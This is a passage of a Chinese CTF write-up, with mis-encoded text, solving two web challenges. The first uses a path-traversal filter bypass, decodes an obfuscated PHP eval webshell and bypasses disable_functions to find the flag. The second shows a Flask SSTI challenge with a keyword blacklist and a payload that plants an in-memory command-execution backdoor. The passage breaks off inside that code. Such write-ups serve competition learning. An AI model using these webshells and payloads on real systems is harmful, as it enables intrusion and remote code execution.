<span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Sun, 15 Dec 2024 02:10:51 GMT</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html; charset=UTF-8</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Vary</span><span class="token punctuation">:</span> <span class="token header-value">Accept-Encoding</span></span>
<span class="token header"><span class="token header-name keyword">tip</span><span class="token punctuation">:</span> <span class="token header-value">&amp;#105;&amp;#110;&amp;#99;&amp;#108;&amp;#117;&amp;#100;&amp;#101;&amp;#46;&amp;#112;&amp;#104;&amp;#112</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">2470</span></span>

&lt;!-- ../hackme.php -->
&lt;!--  ../tips.php  -->


&lt;div class="relocating">
Navigating to: &lt;span class="relocate-location">&lt;/span>...
&lt;/div><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>tipè§£ç å‡ºæ¥æ˜¯ include.phpï¼Œä½†æ˜¯è®¿é—®ä¸åˆ°è¿™ä¸ªæ–‡ä»¶</p>
<p>index.phpï¼Œhello.phpï¼Œhackme.phpï¼Œtips.php å‡åœ¨åŒä¸€æ–‡ä»¶å¤¹ä¸‹ï¼Œä½†æ˜¯ä¸Šé¢çš„ hint é‡Œæ˜¯<code>../</code>ï¼Œè€Œæˆ‘ä»¬è¾“å…¥çš„ ..&#x2F;hackme.php å®é™…ä¸Šè®¿é—®çš„ä¹Ÿæ˜¯ hackme.php</p>
<p>ç»“åˆ Navigating ï¼ŒçŒœæµ‹æ›¿æ¢äº†<code>../</code>ä¸ºç©ºï¼Œæœ‰åŒå†™ç»•è¿‡ï¼Œå°è¯•<code>..././hackme.php</code></p>
<p>èƒ½è¯»åˆ°</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$lJbGIY</span><span class="token operator">=</span><span class="token string double-quoted-string">"eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME"</span><span class="token punctuation">;</span><span class="token variable">$OlWYMv</span><span class="token operator">=</span><span class="token string double-quoted-string">"zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel"</span><span class="token punctuation">;</span><span class="token variable">$lapUCm</span><span class="token operator">=</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$YwzIst</span><span class="token operator">=</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">33</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">30</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token variable">$OxirhK</span><span class="token operator">=</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">33</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">10</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">24</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">10</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">24</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token variable">$YpAUWC</span><span class="token operator">=</span><span class="token variable">$OxirhK</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">18</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$OxirhK</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$OxirhK</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">24</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token variable">$rVkKjU</span><span class="token operator">=</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">13</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token variable">$YwzIst</span><span class="token operator">.=</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">22</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">36</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">29</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">26</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">30</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">32</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">35</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">26</span><span class="token punctuation">&#125;</span><span class="token operator">.</span><span class="token variable">$lapUCm</span><span class="token punctuation">&#123;</span><span class="token number">30</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$YwzIst</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw=="</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>$YwzIst æ˜¯ base64_decodeï¼Œdecodeåçš„å†…å®¹ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$uWcdaA</span><span class="token operator">=</span><span class="token string double-quoted-string">"eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxMEzqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrelmM9jWAfxqnT2UYjLKi9qw1DFYNIhgYRsDhUVBwEXGvE7HM8+Ox=="</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'?>'</span><span class="token operator">.</span><span class="token variable">$YwzIst</span><span class="token punctuation">(</span><span class="token variable">$OxirhK</span><span class="token punctuation">(</span><span class="token variable">$YpAUWC</span><span class="token punctuation">(</span><span class="token variable">$uWcdaA</span><span class="token punctuation">,</span><span class="token variable">$rVkKjU</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$YpAUWC</span><span class="token punctuation">(</span><span class="token variable">$uWcdaA</span><span class="token punctuation">,</span><span class="token variable">$rVkKjU</span><span class="token punctuation">,</span><span class="token variable">$rVkKjU</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$YpAUWC</span><span class="token punctuation">(</span><span class="token variable">$uWcdaA</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$rVkKjU</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å¤åˆ¶åˆ°æœ¬åœ°ä¸€æ­¥æ­¥ echo åˆ†æå‡ºæ¥</p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215170723989.png" alt="image-20241215170723989"></p>
<p>é‚£ä¹ˆshellå°±æ˜¯ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd_66.99'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>èšå‰‘è¿ä¸Šå»ï¼Œæ³¨æ„å¯†ç å‚æ•°è¿™é‡Œæ˜¯<code>cmd[66.99</code></p>
<p>index.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">&lt;!-- ../hackme.php --></span>
<span class="token comment">&lt;!--  ../tips.php  --></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: ./index.php?file=hello.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    @<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'../'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/php:\/\/|http|data|ftp|input|%00/i'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">14</span><span class="token punctuation">)</span> 
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h1>NAIVE!!!&lt;/h1>"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> 
            <span class="token punctuation">&#123;</span>
                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;div style='text-align: center;'>"</span><span class="token punctuation">;</span>
                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/div>"</span><span class="token punctuation">;</span>
                <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å°è¯•æ‹¿èšå‰‘æ’ä»¶æ‰“disable_functionèƒ½å†™ï¼Œä½†æ˜¯è¿ .antproxy.php ä¸Šä¸å»ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p>
<br>

<p>ç»“æŸåè¯•äº†ä¸€ä¸‹ç›´æ¥åœ¨ &#x2F;tmp å†™é©¬ index.phpï¼Œç„¶å fpm èµ· phpserver å¼€åœ¨ &#x2F;tmp ä¸‹ï¼Œå¯†ç å¡« &#x2F;tmp&#x2F;index.php çš„å³å¯ç»•è¿‡ disable_function ä¸”æ­£å¸¸è¿æ¥</p>
<p>æ¥ä¸‹æ¥æ‰¾flagï¼Œæœ¬æ¥ä»¥ä¸ºè¦ææƒçš„ï¼Œæ‰¾äº†åŠå¤©æ²¡ææƒç‚¹</p>
<p><code>find / -type f -name &quot;flag&quot; 2&gt;/dev/null</code>æ‰¾åˆ°äº†ç¥äººflagè·¯å¾„</p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215204605743.png" alt="image-20241215204605743"></p>
<hr>
<h1 id="safeproxy"><a href="#safeproxy" class="headerlink" title="safeproxy"></a>safeproxy</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template_string
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> threading
<span class="token keyword">import</span> html

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'&lt;pre>'</span><span class="token operator">+</span>html<span class="token punctuation">.</span>escape<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'&lt;/pre>'</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">template</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    template_code <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span>
    <span class="token comment"># å®‰å…¨è¿‡æ»¤</span>
    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'__'</span><span class="token punctuation">,</span> <span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'sys'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span> <span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> black <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>
        <span class="token keyword">if</span> black <span class="token keyword">in</span> template_code<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">"Forbidden content detected!"</span>
    result <span class="token operator">=</span> render_template_string<span class="token punctuation">(</span>template_code<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'ok'</span> <span class="token keyword">if</span> result <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">else</span> <span class="token string">'error'</span>

<span class="token keyword">class</span> <span class="token class-name">HTTPProxyHandler</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>target_host <span class="token operator">=</span> target_host
        self<span class="token punctuation">.</span>target_port <span class="token operator">=</span> target_port

    <span class="token keyword">def</span> <span class="token function">handle_request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> client_socket<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            request_data <span class="token operator">=</span> <span class="token string">b""</span>
            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
                chunk <span class="token operator">=</span> client_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>
                request_data <span class="token operator">+=</span> chunk
                <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4096</span><span class="token punctuation">:</span>
                    <span class="token keyword">break</span>

            <span class="token keyword">if</span> <span class="token keyword">not</span> request_data<span class="token punctuation">:</span>
                client_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span>

            <span class="token keyword">with</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token keyword">as</span> proxy_socket<span class="token punctuation">:</span>
                proxy_socket<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>target_host<span class="token punctuation">,</span> self<span class="token punctuation">.</span>target_port<span class="token punctuation">)</span><span class="token punctuation">)</span>
                proxy_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>request_data<span class="token punctuation">)</span>

                response_data <span class="token operator">=</span> <span class="token string">b""</span>
                <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
                    chunk <span class="token operator">=</span> proxy_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>
                    <span class="token keyword">if</span> <span class="token keyword">not</span> chunk<span class="token punctuation">:</span>
                        <span class="token keyword">break</span>
                    response_data <span class="token operator">+=</span> chunk

            header_end <span class="token operator">=</span> response_data<span class="token punctuation">.</span>rfind<span class="token punctuation">(</span><span class="token string">b"\r\n\r\n"</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> header_end <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
                body <span class="token operator">=</span> response_data<span class="token punctuation">[</span>header_end <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                body <span class="token operator">=</span> response_data
                
            response_body <span class="token operator">=</span> body
            response <span class="token operator">=</span> <span class="token string">b"HTTP/1.1 200 OK\r\n"</span> \
                       <span class="token string">b"Content-Length: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>response_body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\r\n"</span> \
                       <span class="token string">b"Content-Type: text/html; charset=utf-8\r\n"</span> \
                       <span class="token string">b"\r\n"</span> <span class="token operator">+</span> response_body

            client_socket<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>response<span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Proxy Error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">finally</span><span class="token punctuation">:</span>
            client_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">start_proxy_server</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span><span class="token punctuation">:</span>
    proxy_handler <span class="token operator">=</span> HTTPProxyHandler<span class="token punctuation">(</span>target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span>
    server_socket <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
    server_socket<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
    server_socket<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Proxy server is running on </span><span class="token interpolation"><span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>port<span class="token punctuation">&#125;</span></span><span class="token string"> and forwarding to </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_host<span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_port<span class="token punctuation">&#125;</span></span><span class="token string">..."</span></span><span class="token punctuation">)</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            client_socket<span class="token punctuation">,</span> addr <span class="token operator">=</span> server_socket<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Connection from </span><span class="token interpolation"><span class="token punctuation">&#123;</span>addr<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>proxy_handler<span class="token punctuation">.</span>handle_request<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>client_socket<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            thread<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>
            thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Shutting down proxy server..."</span><span class="token punctuation">)</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        server_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">run_flask_app</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    proxy_host <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span>
    proxy_port <span class="token operator">=</span> <span class="token number">5001</span>
    target_host <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>
    target_port <span class="token operator">=</span> <span class="token number">5000</span>

    <span class="token comment"># å®‰å…¨åä»£ï¼Œé˜²æ­¢é’ˆå¯¹å“åº”å¤´çš„æ”»å‡»</span>
    proxy_thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>start_proxy_server<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>proxy_host<span class="token punctuation">,</span> proxy_port<span class="token punctuation">,</span> target_host<span class="token punctuation">,</span> target_port<span class="token punctuation">)</span><span class="token punctuation">)</span>
    proxy_thread<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>
    proxy_thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Starting Flask app..."</span><span class="token punctuation">)</span>
    run_flask_app<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸€çœ¼æ‰“sstiï¼Œban äº†å“åº”å¤´</p>
<p>æ‰“å†…å­˜é©¬åœ¨å“åº”ä½“é‡Œå°±è¡Œ</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> fenjing
<span class="token keyword">import</span> logging

<span class="token keyword">import</span> requests

logging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>level<span class="token operator">=</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
[
    app.view_functions
    for app in [ __import__('sys').modules["__main__"].app ]
    for request in [ __import__('sys').modules["__main__"].request ]
    if [
        app.__dict__.update(&#123;'_got_first_request':False&#125;),
        app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)
    ]
]
"""</span>


<span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span>
